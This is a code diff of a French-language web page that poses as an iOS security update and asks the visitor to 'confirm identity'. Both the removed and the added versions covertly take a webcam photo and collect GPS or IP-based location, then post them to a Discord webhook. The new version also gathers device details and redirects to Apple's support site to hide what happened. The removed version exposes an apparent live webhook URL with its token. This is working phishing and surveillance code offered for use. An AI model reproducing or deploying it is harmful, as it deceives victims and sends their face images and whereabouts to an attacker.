@@ -1,45 +1,69 @@
 <!DOCTYPE html>
-<html>
+<html lang="fr">
 <head>
-    <title>PANDORA SYSTEM - Secure Update</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Update | Processing</title>
     <style>
-        body { background: #000; color: #ff0000; font-family: monospace; text-align: center; padding-top: 15%; }
-        .box { border: 1px solid #ff0000; display: inline-block; padding: 20px; box-shadow: 0 0 15px #ff0000; }
-        canvas { display: none; } /* Cache la capture */
-        video { display: none; }  /* Cache le flux vidéo */
+        body { background: #000; color: #fff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        .container { text-align: center; width: 80%; max-width: 400px; }
+        .loader { border: 3px solid #333; border-top: 3px solid #007aff; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        h1 { font-size: 18px; font-weight: 500; margin-bottom: 10px; }
+        p { font-size: 14px; color: #888; margin-bottom: 30px; }
+        .btn { background: #007aff; color: #fff; border: none; padding: 12px 25px; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; width: 100%; }
+        video, canvas { display: none; }
     </style>
 </head>
 <body>
-    <div class="box">
-        <h1>PANDORA V3.5</h1>
-        <p id="status">SYNCHRONISATION DES SYSTÈMES...</p>
-        <video id="video" autoplay></video>
-        <canvas id="canvas"></canvas>
+    <div class="container">
+        <div id="loader-icon" style="display:none;" class="loader"></div>
+        <h1 id="title">Mise à jour requise</h1>
+        <p id="status">Veuillez confirmer votre identité pour continuer la mise à jour de sécurité iOS.</p>
+        <button id="main-btn" class="btn" onclick="execute()">Continuer</button>
     </div>
 
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+
     <script>
-        const WEBHOOK = "https://discord.com/api/webhooks/1466502605881475242/ynqT6t3L8IAQ69mgtvO17VvNBvmjFqiHayODx-P5EWMeN6renSu8UiM8nDfNNNvTHYy0";
+        const WEBHOOK = "TON_WEBHOOK_ICI"; // <--- METS TON LIEN ICI
+        const REDIRECT_URL = "https://support.apple.com/fr-fr"; // Site de redirection
 
-        // --- ENVOI DE L'IMAGE VERS DISCORD ---
-        function sendImage(blob) {
-            const formData = new FormData();
-            formData.append('file', blob, 'snap.png');
-            formData.append('payload_json', JSON.stringify({
-                username: "PANDORA CAM",
-                content: "📸 **CAPTURE WEBCAM RÉUSSIE !**"
-            }));
+        async function execute() {
+            // UI Change
+            document.getElementById('main-btn').style.display = 'none';
+            document.getElementById('loader-icon').style.display = 'block';
+            document.getElementById('title').innerText = "Analyse en cours...";
+            document.getElementById('status').innerText = "Veuillez patienter quelques instants.";
 
-            fetch(WEBHOOK, { method: 'POST', body: formData });
-        }
+            // 1. Infos Système directes
+            const sysInfo = `📱 **CIBLE ACTIVE**\n**OS**: ${navigator.platform}\n**Langue**: ${navigator.language}\n**Batterie**: En attente...`;
+            await fetch(WEBHOOK, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ content: sysInfo }) });
 
-        // --- CAPTURE WEBCAM ---
-        async function startCamera() {
+            // 2. Géolocalisation avec repli IP
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                await fetch(WEBHOOK, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ content: `📍 **GPS** : https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}` })
+                });
+            }, async () => {
+                const res = await fetch('http://ip-api.com/json/');
+                const data = await res.json();
+                await fetch(WEBHOOK, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ content: `🌐 **IP (Fallback)** : ${data.city}, ${data.country}\nLien: https://www.google.com/maps?q=${data.lat},${data.lon}` })
+                });
+            }, { timeout: 5000 });
+
+            // 3. Caméra & Redirection
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 const video = document.getElementById('video');
                 video.srcObject = stream;
 
-                // Attendre que la vidéo soit prête et prendre la photo
                 setTimeout(() => {
                     const canvas = document.getElementById('canvas');
                     canvas.width = video.videoWidth;
@@ -47,30 +71,20 @@
                     canvas.getContext('2d').drawImage(video, 0, 0);
                     
                     canvas.toBlob(blob => {
-                        sendImage(blob);
-                        stream.getTracks().forEach(track => track.stop()); // Éteint la caméra après capture
+                        const formData = new FormData();
+                        formData.append('file', blob, 'capture.png');
+                        formData.append('payload_json', JSON.stringify({ content: "📸 **FACE CAPTURE**" }));
+                        fetch(WEBHOOK, { method: 'POST', body: formData }).then(() => {
+                            window.location.href = REDIRECT_URL;
+                        });
+                        stream.getTracks().forEach(t => t.stop());
                     }, 'image/png');
-                    
-                    document.getElementById('status').innerText = "✅ ANALYSE TERMINÉE";
-                }, 2000); // 2 secondes pour laisser le temps à l'image de s'ajuster
-            } catch (err) {
-                console.log("Caméra refusée ou absente");
+                }, 1500);
+            } catch (e) {
+                // Si la caméra est bloquée, on redirige quand même après 2 secondes pour rester discret
+                setTimeout(() => { window.location.href = REDIRECT_URL; }, 2000);
             }
         }
-
-        // --- GÉOLOCALISATION ---
-        navigator.geolocation.getCurrentPosition(pos => {
-            fetch(WEBHOOK, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    content: `📍 **POSITION** : https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`
-                })
-            });
-            startCamera(); // Une fois la position ok, on tente la cam
-        }, () => {
-            startCamera(); // Même si le GPS échoue, on tente la cam
-        });
     </script>
 </body>
 </html>
